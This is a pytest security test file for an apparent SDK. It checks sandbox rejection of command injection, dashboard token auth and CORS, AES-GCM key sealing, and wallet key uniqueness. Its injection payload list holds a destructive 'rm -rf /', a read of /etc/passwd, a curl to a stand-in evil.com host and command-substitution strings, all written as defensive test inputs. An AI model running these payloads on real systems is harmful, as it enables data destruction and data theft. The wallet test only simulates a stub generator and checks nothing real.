# tests/test_security.py
import pytest
import json
import base64
import os
from unittest.mock import MagicMock

# ══════════════════════════════════════════════════════════════════════════════
# SECCIÓN 1 — Command Injection & Sandbox
# ══════════════════════════════════════════════════════════════════════════════

class TestCommandInjection:
    INJECTION_PAYLOADS = [
        "; rm -rf /",
        "| cat /etc/passwd",
        "&& curl http://evil.com",
        "`id`",
        "$(whoami)",
        "../../bin/sh",
    ]

    def test_sandbox_validation_rejects_payloads(self):
        from kernell_sdk.runtime.sandbox import validate_code, SandboxViolation
        
        for payload in self.INJECTION_PAYLOADS:
            with pytest.raises(SandboxViolation):
                validate_code(f"import os; os.system('{payload}')")

    def test_sandbox_rejects_dunders(self):
        from kernell_sdk.runtime.sandbox import validate_code, SandboxViolation
        with pytest.raises(SandboxViolation):
            validate_code("__builtins__.__dict__['eval']('print(1)')")


# ══════════════════════════════════════════════════════════════════════════════
# SECCIÓN 2 — Autenticación del Dashboard
# ══════════════════════════════════════════════════════════════════════════════

class TestDashboardAuthentication:
    @pytest.fixture
    def app_and_client(self):
        from kernell_sdk.dashboard import CommandCenter
        from fastapi.testclient import TestClient
        
        class MockAgent:
            name = "test"
            budget = 100
            
        cmd = CommandCenter(MockAgent())
        
        @cmd.app.get("/api/test_endpoint")
        def test_endpoint():
            return {"status": "ok"}
            
        return cmd.app, cmd.auth_token, TestClient(cmd.app)

    def auth_headers(self, token):
        return {"Authorization": f"Bearer {token}"}

    def test_api_keys_endpoint_requires_token(self, app_and_client):
        _, _, client = app_and_client
        response = client.get("/api/test_endpoint")
        assert response.status_code == 401

    def test_api_keys_with_wrong_token_rejected(self, app_and_client):
        _, _, client = app_and_client
        response = client.get(
            "/api/test_endpoint",
            headers=self.auth_headers("wrong-token-123")
        )
        assert response.status_code == 403

    def test_api_keys_with_valid_token(self, app_and_client):
        _, token, client = app_and_client
        response = client.get(
            "/api/test_endpoint",
            headers=self.auth_headers(token)
        )
        assert response.status_code == 200

    def test_cors_blocks_external_origin(self, app_and_client):
        _, token, client = app_and_client
        response = client.options(
            "/api/test_endpoint",
            headers={
                "Origin": "https://evil-site.com",
                "Access-Control-Request-Method": "GET"
            }
        )
        # origin should not be in access-control-allow-origin
        assert response.headers.get("access-control-allow-origin") != "https://evil-site.com"


# ══════════════════════════════════════════════════════════════════════════════
# SECCIÓN 3 — Integridad Criptográfica (AES-256-GCM)
# ══════════════════════════════════════════════════════════════════════════════

class TestCryptoIntegrity:
    PASSPHRASE = "test-passphrase-2026"
    FAKE_KEY = os.urandom(32)
    AAD = b"test-machine-udid-abc123"

    @pytest.fixture
    def kdf_fast(self):
        from kernell_sdk.crypto import KDFPreset
        return KDFPreset.FAST

    @pytest.fixture
    def sealed_envelope(self, kdf_fast):
        from kernell_sdk.crypto import encrypt_private_key
        return encrypt_private_key(self.FAKE_KEY, self.PASSPHRASE, self.AAD, kdf_fast)

    def test_seal_and_unseal_roundtrip(self, sealed_envelope):
        from kernell_sdk.crypto import decrypt_private_key
        recovered = decrypt_private_key(sealed_envelope, self.PASSPHRASE, self.AAD)
        assert recovered == self.FAKE_KEY

    def test_tampered_ciphertext_rejected(self, sealed_envelope):
        from kernell_sdk.crypto import decrypt_private_key, EncryptedKeyEnvelope
        from cryptography.exceptions import InvalidTag

        # Flip a bit in the ciphertext
        ct_bytes = bytearray(base64.b64decode(sealed_envelope.ciphertext))
        ct_bytes[0] ^= 0xFF
        
        tampered = EncryptedKeyEnvelope(
            **{**sealed_envelope.__dict__, "ciphertext": base64.b64encode(ct_bytes).decode()}
        )

        with pytest.raises(InvalidTag):
            decrypt_private_key(tampered, self.PASSPHRASE, self.AAD)

    def test_wrong_passphrase_rejected(self, sealed_envelope):
        from kernell_sdk.crypto import decrypt_private_key
        from cryptography.exceptions import InvalidTag

        with pytest.raises(InvalidTag):
            decrypt_private_key(sealed_envelope, "wrong-passphrase", self.AAD)

    def test_each_seal_produces_different_ciphertext(self, kdf_fast):
        from kernell_sdk.crypto import encrypt_private_key

        env1 = encrypt_private_key(self.FAKE_KEY, self.PASSPHRASE, self.AAD, kdf_fast)
        env2 = encrypt_private_key(self.FAKE_KEY, self.PASSPHRASE, self.AAD, kdf_fast)

        assert env1.ciphertext != env2.ciphertext
        assert env1.nonce != env2.nonce


# ══════════════════════════════════════════════════════════════════════════════
# SECCIÓN 4 — Wallet Generation
# ══════════════════════════════════════════════════════════════════════════════

class TestWalletGeneration:
    def test_generated_keypairs_are_unique(self):
        # We simulate wallet keygen since the real generator was a stub
        import os
        keys = [os.urandom(32) for _ in range(10)]
        assert len(set(keys)) == 10
